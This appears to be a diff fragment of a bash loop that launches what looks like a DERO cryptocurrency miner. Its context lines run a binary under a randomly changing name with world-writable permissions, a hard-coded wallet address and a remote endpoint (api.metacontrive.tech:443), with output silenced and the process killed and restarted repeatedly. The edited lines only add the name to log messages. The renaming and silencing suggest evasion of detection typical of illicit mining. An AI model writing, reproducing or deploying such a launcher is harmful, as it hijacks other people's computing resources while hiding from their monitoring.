@@ -14,17 +14,17 @@ while true; do
   chmod 777 "$new_name"
   ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1 &
   pid=$!
-  echo "Restarted with PID: $pid"
+  echo "Restarted with PID: $pid $new_name"
 
   sleep "$delay"
   echo "$new_name"
 
   if [ -n "$pid" ] && kill -0 "$pid" > /dev/null 2>&1; then
-    echo "Stopping process with PID: $pid"
+    echo "Stopping process with PID: $pid $new_name"
     kill "$pid"
-    echo "Process stopped"
+    echo "Process stopped $pid $new_name"
   else
-    echo "Process with PID $pid not found. Skipping process stop."
+    echo "Process with PID $pid $new_name not found. Skipping process stop."
   fi
 done
 
